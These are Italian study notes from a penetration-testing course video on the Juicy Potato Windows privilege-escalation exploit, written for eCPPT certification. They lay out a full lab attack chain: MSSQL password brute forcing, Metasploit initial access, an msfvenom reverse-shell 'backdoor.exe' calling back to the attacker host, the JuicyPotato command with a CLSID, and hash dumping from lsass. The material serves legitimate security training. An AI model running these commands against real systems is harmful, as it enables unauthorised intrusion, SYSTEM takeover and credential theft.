# 011 — Juicy Potato (Privilege Escalation)

> **Modulo:** Privilege Escalation · **Video:** 11/19
> **Istruttore:** Alexis Ahmed (HackerSploit / INE)
> **Fonte appunti:** [011_Juicy Potato.txt](011_Juicy Potato.txt) · [011_Juicy Potato.srt](011_Juicy Potato.srt)

## Concetti chiave

- **Juicy Potato** è un exploit Windows che sfrutta **DCOM** (Distributed COM) e **RPCSS** per abusare di **token manipulation** ed elevare da un account di servizio (con `SeImpersonate` o `SeAssignPrimaryToken`) a **NT AUTHORITY\SYSTEM**.
- Evoluzione di **RottenPotato** → funziona quando NON ci sono token privilegiati già in memoria (caso in cui Incognito da solo fallisce — vedi video 10).
- Funziona registrando un **fake COM server** con un **CLSID** specifico per la versione di Windows → DCOM lo invoca, il token che fluisce viene impersonato come SYSTEM.
- **Requisiti**: account con `SeImpersonatePrivilege` **o** `SeAssignPrimaryTokenPrivilege` (tipico in service account: `LOCAL SERVICE`, `NETWORK SERVICE`, `IIS APPPOOL\*`, `MSSQL$*`).
- Risultato lab: shell come `NT SERVICE\MSSQL$SQLEXPRESS` → niente token admin in memoria → JuicyPotato + CLSID Server 2016 + payload meterpreter → seconda sessione come **NT AUTHORITY\SYSTEM**.

## Spiegazione approfondita

### Famiglia "Potato" — riepilogo essenziale

| Exploit | Anno | Tecnica | Quando usarlo |
|---|---|---|---|
| **HotPotato** | 2016 | NBNS spoofing + WPAD + HTTP→SMB relay | Win7/8/Server2008-2012, no patch MS16-075 |
| **RottenPotato** | 2017 | NTLM relay locale via DCOM | Originale, Windows 7/Server 2008 |
| **JuicyPotato** | 2018 | Variante "weaponizzata" di Rotten con qualsiasi CLSID | Win7/8/10 ≤ 1803, Server 2008/2012/2016 |
| **RoguePotato** | 2020 | RPC redirect su porta 135 esterna | Win10 1809+, Server 2019 (Juicy patchato) |
| **PrintSpoofer** | 2020 | Abuso `SpoolerService` named pipe | Win10/Server 2019 con Spooler attivo |
| **GodPotato** | 2023 | RPC su DCOM senza Spooler | Win10/11, Server 2022 |

### Come funziona Juicy Potato (tecnico)

1. **CLSID**: ogni componente COM ha un GUID. Alcuni CLSID girano come SYSTEM e accettano comunicazione cross-session.
2. JuicyPotato avvia un **fake OXID resolver** locale e si finge il COM server.
3. Forza l'attivazione DCOM → arriva una connessione **come SYSTEM** verso il fake server.
4. Il fake server **acquisisce il token SYSTEM** dalla connessione.
5. Con il `SeImpersonate` (che già possediamo) → **impersona** quel token → spawn un processo arbitrario come SYSTEM.

### Workflow lab

1. **Recon**: nmap → MSSQL 2019 su 1433 (Contoso domain, Server 2016).
2. **Brute force MSSQL**: `auxiliary/scanner/mssql/mssql_login` con `common_users.txt` + `100_most_common_passwords.txt` → trovato `sa` con **password vuota**.
3. **Initial access**: `exploit/windows/mssql/mssql_payload` → meterpreter come `NT SERVICE\MSSQL$SQLEXPRESS`.
4. **Check privilegi**: `getprivs` → `SeAssignPrimaryTokenPrivilege`, `SeImpersonatePrivilege` presenti.
5. **Check token**: `load incognito` + `list_tokens -u` → solo token non-privilegiati → Incognito non basta.
6. **Setup payload secondario**: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<KALI> LPORT=5555 -f exe -o backdoor.exe`.
7. **Handler secondario** in background: `use exploit/multi/handler`, payload reverse_tcp, LPORT 5555, `exploit -j`.
8. **Upload** `backdoor.exe` + `JuicyPotato.exe` in `C:\Users\Public\`.
9. **Recupero CLSID** per Server 2016 dalla lab documentation (repo GitHub `ohpe/juicy-potato`).
10. **Esecuzione**:
    ```
    JuicyPotato.exe -l 5555 -p C:\Users\Public\backdoor.exe -t * -c {CLSID}
    ```
11. **Risultato**: `[+] authresult 0 NT AUTHORITY\SYSTEM` → nuova meterpreter session 2 come **SYSTEM**.
12. **Test**: `getuid`, `getprivs`, `hashdump` (richiede `migrate` in `lsass.exe`).

## Comandi & strumenti

| Comando | Scopo |
|---|---|
| `nmap -Pn -n -sS -sV <IP>` | Recon iniziale |
| `nmap -p1433 --script ms-sql-info <IP>` | Enum MSSQL |
| `use auxiliary/scanner/mssql/mssql_login` | Brute force MSSQL |
| `use exploit/windows/mssql/mssql_payload` | Initial access via MSSQL |
| `getprivs` (meterpreter) | Verifica `SeImpersonate`/`SeAssignPrimaryToken` |
| `load incognito` + `list_tokens -u` | Verifica assenza token privilegiati |
| `msfvenom -p windows/meterpreter/reverse_tcp LHOST=.. LPORT=5555 -f exe -o backdoor.exe` | Payload secondario |
| `upload <file> C:\\Users\\Public\\` | Trasferimento su target |
| `JuicyPotato.exe -l <port> -p <cmd> -t * -c {CLSID}` | Esecuzione exploit |
| `use exploit/multi/handler` (LPORT 5555) | Listener per la SYSTEM shell |
| `migrate <PID-lsass>` + `hashdump` | Post-exploitation |

### Flag JuicyPotato

| Flag | Significato |
|---|---|
| `-l` | Porta del fake COM server (locale) |
| `-p` | Programma da lanciare (full path) |
| `-a` | Argomenti del programma |
| `-t` | Modalità di creazione (`*` = entrambi `CreateProcessWithTokenW` e `CreateProcessAsUser`) |
| `-c` | CLSID (dipende dalla versione Windows) |
| `-k` | Hostname COM server (default 127.0.0.1) |
| `-n` | Porta COM server (default 135) |

## Esempi pratici

```bash
# 1. Recon + initial access
nmap -Pn -n -sS -sV 10.10.10.x
nmap -p1433 --script ms-sql-info 10.10.10.x

msfconsole -q
use auxiliary/scanner/mssql/mssql_login
set RHOSTS 10.10.10.x
set USER_FILE /root/Desktop/wordlists/common_users.txt
set PASS_FILE /root/Desktop/wordlists/100_most_common_passwords.txt
set VERBOSE false
run
# trovato: sa : (empty)

use exploit/windows/mssql/mssql_payload
set RHOSTS 10.10.10.x
set USERNAME sa
set PASSWORD ""
exploit
# meterpreter come NT SERVICE\MSSQL$SQLEXPRESS

# 2. Payload secondario
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.22.2 LPORT=5555 -f exe -o backdoor.exe

# 3. Handler secondario in background
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.10.22.2
set LPORT 5555
exploit -j
```

```text
# 4. Nella prima meterpreter session
meterpreter > getprivs
... SeImpersonatePrivilege, SeAssignPrimaryTokenPrivilege ...

meterpreter > cd C:\\Users\\Public
meterpreter > upload /root/backdoor.exe
meterpreter > upload /root/Desktop/tools/JuicyPotato/JuicyPotato.exe

meterpreter > shell
C:\Users\Public> JuicyPotato.exe -l 5555 -p C:\Users\Public\backdoor.exe -t * -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}
Testing {F7FD3FD6-...} 5555
[+] authresult 0
nt authority\system
```

```text
# 5. Seconda session = SYSTEM
msf > sessions -i 2
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > migrate <PID lsass.exe>
meterpreter > load kiwi
meterpreter > hashdump
```

## Punti d'attenzione per l'esame eCPPT

- **Decisione tra Incognito e Juicy Potato**:
  | Scenario | Tool |
  |---|---|
  | Ho `SeImpersonate` **E** token admin in memoria | Incognito (`impersonate_token`) — video 10 |
  | Ho `SeImpersonate` **MA** nessun token admin | **Juicy Potato / variante** |
  | Win10 1809+ o Server 2019 | RoguePotato / PrintSpoofer (Juicy patchato) |
  | Win10/11/Server 2022 | PrintSpoofer / GodPotato |
- **CLSID dipende dalla versione di Windows** → repo `ohpe/juicy-potato` ha la tabella. Sbagliare CLSID → `authresult` errore.
- **Service account tipici sfruttabili**: `LOCAL SERVICE`, `NETWORK SERVICE`, `IIS APPPOOL\<pool>`, `NT SERVICE\MSSQL$<inst>`.
- **Sintassi minima da memorizzare**: `JuicyPotato.exe -l <port> -p <exe> -t * -c {CLSID}`.
- **`-t *`**: prova entrambi `CreateProcessWithTokenW` e `CreateProcessAsUser` — più robusto.
- **OPSEC**: porta 135 (RPC) deve poter contattare il fake OXID locale. Loopback ok.
- Differenza Juicy vs Rotten: Juicy permette di scegliere **qualsiasi** CLSID + porta arbitraria; Rotten era hardcoded.

## Collegamenti con altri video

- Precedente: [[010_ Access Token Impersonation]] — caso "facile" con Incognito.
- Prossimo: [[012_Bypassing UAC with UACMe]]
- Privilegi del token: [[02_Introduction to Privilege Escalation]] (`whoami /priv`).
- Dump credenziali post-SYSTEM: `kiwi`/`mimikatz` (modulo AD Penetration Testing).
- Modern alternatives mainstream sul target attuale: PrintSpoofer / GodPotato (non eseguiti nel corso ma da conoscere).
